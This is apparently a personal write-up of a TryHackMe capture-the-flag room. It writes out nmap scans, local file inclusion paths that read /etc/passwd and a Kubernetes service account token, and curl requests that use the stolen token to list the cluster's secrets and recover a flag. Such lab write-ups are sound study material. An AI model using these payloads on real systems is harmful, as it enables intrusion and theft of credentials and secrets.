# Island Orchestration 

nmap 

	nmap -sC -sV 10.10.231.27
and the output was like 

	Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 12:40 EDT
	Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
	Connect Scan Timing: About 91.04% done; ETC: 12:40 (0:00:03 remaining)
	Nmap scan report for 10.10.231.27
	Host is up (0.18s latency).
	Not shown: 997 closed tcp ports (conn-refused)
	PORT     STATE    SERVICE   VERSION
	22/tcp   open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
	|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
	|_  256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
	80/tcp   filtered http
	8443/tcp filtered https-alt
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                            
	Nmap done: 1 IP address (1 host up) scanned in 39.60 seconds  
and there was 2 site running one on port 80 and another on 8443


	Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 13:27 EDT
	Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
	Service scan Timing: About 0.00% done
	Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
	Service scan Timing: About 0.00% done
	Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
	Service scan Timing: About 0.00% done
	Nmap scan report for 10.10.231.27
	Host is up (0.17s latency).

	PORT     STATE SERVICE       VERSION
	8443/tcp open  ssl/https-alt
	| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
	| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:192.168.49.2, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
	| Not valid before: 2022-01-05T23:39:08
	|_Not valid after:  2025-01-05T23:39:08
	|_ssl-date: TLS randomness does not represent time
	|_http-title: Site doesn't have a title (application/json).
	| tls-alpn: 
	|   h2
	|_  http/1.1
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.0 403 Forbidden
	|     Audit-Id: d41ff720-18ee-4184-bd44-eff122b1beb6
	|     Cache-Control: no-cache, private
	|     Content-Type: application/json
	|     X-Content-Type-Options: nosniff
	|     X-Kubernetes-Pf-Flowschema-Uid: a5c8dc51-1beb-4524-9996-fcbdf17ad8d9
	|     X-Kubernetes-Pf-Prioritylevel-Uid: 9a40dace-d4fe-4ce4-8625-787c338bd84b
	|     Date: Mon, 04 Jul 2022 17:27:22 GMT
	|     Content-Length: 212
	|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
	|   GetRequest: 
	|     HTTP/1.0 403 Forbidden
	|     Audit-Id: fe77cacc-2191-48ae-8e25-dcb96d99eb16
	|     Cache-Control: no-cache, private
	|     Content-Type: application/json
	|     X-Content-Type-Options: nosniff
	|     X-Kubernetes-Pf-Flowschema-Uid: a5c8dc51-1beb-4524-9996-fcbdf17ad8d9
	|     X-Kubernetes-Pf-Prioritylevel-Uid: 9a40dace-d4fe-4ce4-8625-787c338bd84b
	|     Date: Mon, 04 Jul 2022 17:27:21 GMT
	|     Content-Length: 185
	|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
	|   HTTPOptions: 
	|     HTTP/1.0 403 Forbidden
	|     Audit-Id: 7106afc6-8b19-4e50-bc71-326c690f949d
	|     Cache-Control: no-cache, private
	|     Content-Type: application/json
	|     X-Content-Type-Options: nosniff
	|     X-Kubernetes-Pf-Flowschema-Uid: a5c8dc51-1beb-4524-9996-fcbdf17ad8d9
	|     X-Kubernetes-Pf-Prioritylevel-Uid: 9a40dace-d4fe-4ce4-8625-787c338bd84b
	|     Date: Mon, 04 Jul 2022 17:27:22 GMT
	|     Content-Length: 189
	|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=7/4%Time=62C322F8%P=x86_64-pc-linux-gnu
	SF:%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20fe77ca
	SF:cc-2191-48ae-8e25-dcb96d99eb16\r\nCache-Control:\x20no-cache,\x20privat
	SF:e\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20no
	SF:sniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20a5c8dc51-1beb-4524-9996-fcb
	SF:df17ad8d9\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x209a40dace-d4fe-4ce4-8
	SF:625-787c338bd84b\r\nDate:\x20Mon,\x2004\x20Jul\x202022\x2017:27:21\x20G
	SF:MT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\"
	SF::\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:
	SF:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/\
	SF:\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTPO
	SF:ptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x207106afc6-8b19
	SF:-4e50-bc71-326c690f949d\r\nCache-Control:\x20no-cache,\x20private\r\nCo
	SF:ntent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r
	SF:\nX-Kubernetes-Pf-Flowschema-Uid:\x20a5c8dc51-1beb-4524-9996-fcbdf17ad8
	SF:d9\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x209a40dace-d4fe-4ce4-8625-787
	SF:c338bd84b\r\nDate:\x20Mon,\x2004\x20Jul\x202022\x2017:27:22\x20GMT\r\nC
	SF:ontent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\"
	SF:,\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Use
	SF:r\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\"
	SF:\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhFo
	SF:urRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20d41ff720-1
	SF:8ee-4184-bd44-eff122b1beb6\r\nCache-Control:\x20no-cache,\x20private\r\
	SF:nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosnif
	SF:f\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20a5c8dc51-1beb-4524-9996-fcbdf17
	SF:ad8d9\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x209a40dace-d4fe-4ce4-8625-
	SF:787c338bd84b\r\nDate:\x20Mon,\x2004\x20Jul\x202022\x2017:27:22\x20GMT\r
	SF:\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v
	SF:1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20
	SF:User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice\
	SF:x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\":
	SF:{},\"code\":403}\n");

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 119.10 seconds

	 
	 
and we found that the site is vulnerable to lfi 
so we some basic lfi and its vulnerable 

	10.10.231.27/?page=../../../../../../../etc/passwd
 
did some research on Kubernetes lfi and found that it has a token 

	 http://10.10.236.174/?page=../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
	 
## token
	 eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg4NDkxOTU4LCJpYXQiOjE2NTY5NTU5NTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2OTU5NTY1fSwibmJmIjoxNjU2OTU1OTU4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WyPc6fANUecUj16PKiAVvbzwt822FP7pnKAHAoIcTgKjr4AQj8HR-GHkJWphmKvnVWFH1OybzfYPUSD2rNKMQtVAEySoFI3jY9MQBshghoMtROyiYRQnBcuw_5LQcFczmSncP3kTc1KCbOzp_nnPoX4ndQLhkbcSfQ8ta9o4jtKMfWrTd3njbHNjZO_AQTOurFfXM3277ZfT7SWLt4KLC5hTVYl4lnJ6EjjgGr_k7V6zAEk1jSJIq7oud0ln-9XJvQR5bl1b8E2j9ooZQ8B1FyIGFxi1gb16EtM2uCFVL9hiBy83hatR6eqvgzQer-6X2g3I-zCF37eTLMi73PlPRg
	 
don't know what to do with the token and did some googling and found that it is encrypted put this in jwt.io to decrypt and found some interesting results 




and i was stuck again don't  know what to do next so i tries lfi on the Kubernetes 

	curl -k http:/10.10.231.27/:8443/kube-apiserver 
	
and  the response were 

	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>404 Not Found</title>
	</head><body>
	<h1>Not Found</h1>
	<p>The requested URL /:8443/kube-apiserver was not found on this server.</p>
	<hr>
	<address>Apache/2.2.22 (Ubuntu) Server at 10.10.231.27 Port 80</address>
	</body></html>
and it responded so i tried to do more lfi but there was authentication problem so i did use the token as the header and did some googling about  "*curl kubernet"* 


	curl -k -v https://10.10.231.27:8443/api/v1/namespaces/ --header 
	
	"Authorization: Bearer  eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg4NDkxOTU4LCJpYXQiOjE2NTY5NTU5NTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2OTU5NTY1fSwibmJmIjoxNjU2OTU1OTU4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WyPc6fANUecUj16PKiAVvbzwt822FP7pnKAHAoIcTgKjr4AQj8HR-GHkJWphmKvnVWFH1OybzfYPUSD2rNKMQtVAEySoFI3jY9MQBshghoMtROyiYRQnBcuw_5LQcFczmSncP3kTc1KCbOzp_nnPoX4ndQLhkbcSfQ8ta9o4jtKMfWrTd3njbHNjZO_AQTOurFfXM3277ZfT7SWLt4KLC5hTVYl4lnJ6EjjgGr_k7V6zAEk1jSJIq7oud0ln-9XJvQR5bl1b8E2j9ooZQ8B1FyIGFxi1gb16EtM2uCFVL9hiBy83hatR6eqvgzQer-6X2g3I-zCF37eTLMi73PlPRg"



did some more enumuration

	curl -k   https://10.10.236.174:8443/api/v1/ -H "Authorization: Bearer $TOKEN"
	
when i did this and the results were intresting i found out that there was  secrets file 
so i began to enumurate it 

	curl -k -v https://10.10.236.174:8443/api/v1/namespaces/default/secrets -H "Authorization: Bearer $TOKEN"

vola !!!!!!!!!!got the flag encrypted


	ZmxhZ3swOGJlZDlmYzBiYzZkOTRmZmY5ZTUxZjI5MTU3Nzg0MX0=

its base64

and the flag is 		

	flag{08bed9fc0bc6d94fff9e51f291577841}
	
	
#tryhackme #medium 